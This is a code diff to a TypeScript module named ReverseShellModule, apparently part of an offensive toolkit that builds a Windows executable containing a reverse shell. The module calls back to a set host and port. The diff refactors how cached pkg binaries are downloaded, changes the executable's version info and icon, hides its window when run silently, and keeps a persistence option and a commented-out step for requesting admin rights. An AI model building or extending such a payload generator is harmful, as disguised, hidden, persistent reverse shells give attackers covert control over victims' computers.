@@ -12,7 +12,7 @@ import { cmdWarn } from '../../utils/cmd';
 
 // save the path to pkg cache folder
 const cachePath = path.join(__dirname, '../../pkg-cache');
-const PKG_CACHE_VERSION = 'v2.6';
+let PKG_CACHE_VERSION;
 
 export default class ReverseShellModule extends Module {
     description = 'Generate an exe with reverse shell in it.';
@@ -20,7 +20,7 @@ export default class ReverseShellModule extends Module {
     listenPort = 4242;
     hostIp = '10.0.2.2';
     finalExeName = 'payload.exe';
-    finalExeDescription = 'sussy backa';
+    finalExeDescription = 'Payload.';
     runSilent: 'true'|'false' = 'true';
     isPersistent: 'true'|'false' = 'true';
     isFilesDependant: 'true'|'false' = 'false';
@@ -46,7 +46,7 @@ export default class ReverseShellModule extends Module {
         },
         {
             arg: 'exe_desc=',
-            desc: "Description of the exe file generated. Default is 'sussy backa'",
+            desc: "Description of the exe file generated. Default is 'Payload.'",
             handler: desc => this.finalExeDescription = desc
         },
         {
@@ -149,42 +149,50 @@ export default class ReverseShellModule extends Module {
         fs.writeFileSync(dummyJs, placeholder);
 
         // download pkg precompiled binaries
-        if(fs.readdirSync(cachePath).length > 0){
-            console.log('[log] - Using existing precompiled binaries...');
-        }
-        else {
-            console.log('[log] - Downloading precompiled binaries...');
-            this.executePkg(dummyJs, 'temp.exe');
-            fs.unlinkSync(path.join(__dirname, `../../temp.exe`));
-        }
+        console.log('[log] - Downloading precompiled binaries...');
+        this.executePkg(dummyJs, 'temp.exe');
+        fs.unlinkSync(path.join(__dirname, `../../temp.exe`));
         
+        PKG_CACHE_VERSION = fs.readdirSync(cachePath)[0];
+
         // get path of fetched binary for windows
         const winBin = fs.readdirSync(path.join(cachePath, `./${PKG_CACHE_VERSION}`)).find(f => f.includes('win'));
+        const winBinPath = path.join(cachePath, `./${PKG_CACHE_VERSION}`, winBin);
 
         // change version info
         console.log('[log] - Changing version info...');
-        await this.changeVersionInfo(path.join(cachePath, `./${PKG_CACHE_VERSION}`, winBin));
+        await this.changeVersionInfo(winBinPath);
 
         // append custom icon to the pkg binaries
         console.log('[log] - Appending custom icon...');
-        await this.changeIcon(path.join(cachePath, `./${PKG_CACHE_VERSION}`, winBin));
+        await this.changeIcon(winBinPath);
+
+        // // make the exe run as admin
+        // console.log('[log] - Making the exe require admin rights...');
+        // this.resourceHacker({
+        //     action: "addoverwrite",
+        //     open: winBinPath,
+        //     save: winBinPath,
+        //     resource: path.join(__dirname, './admin-manifest.res'),
+        //     mask: "MANIFEST,1,",
+        // });
 
         // compile final exe
         console.log('[log] - Compiling final exe...');
         this.executePkg(dummyJs, this.finalExeName);
+        const finalExePath = path.join(__dirname, `../../${this.finalExeName}`);
         
         // make the exe hidden
         if(this.runSilent.toLowerCase() == "true"){
             console.log('[log] - Making the exe hidden...');
             require('create-nodew-exe')({
-                src: path.join(__dirname, `../../${this.finalExeName}`),
-                dst: path.join(__dirname, `../../${this.finalExeName}`),
+                src: finalExePath,
+                dst: finalExePath,
             });
         }
 
-        // remove the leftovers
-        console.log('[log] - Removing leftover files...');
-        fs.unlinkSync(dummyJs);
+        // clear leftovers
+        fs.rmSync(path.join(cachePath, `./${PKG_CACHE_VERSION}`),{ recursive: true, force: true });
     }
 
     async handleListen() {
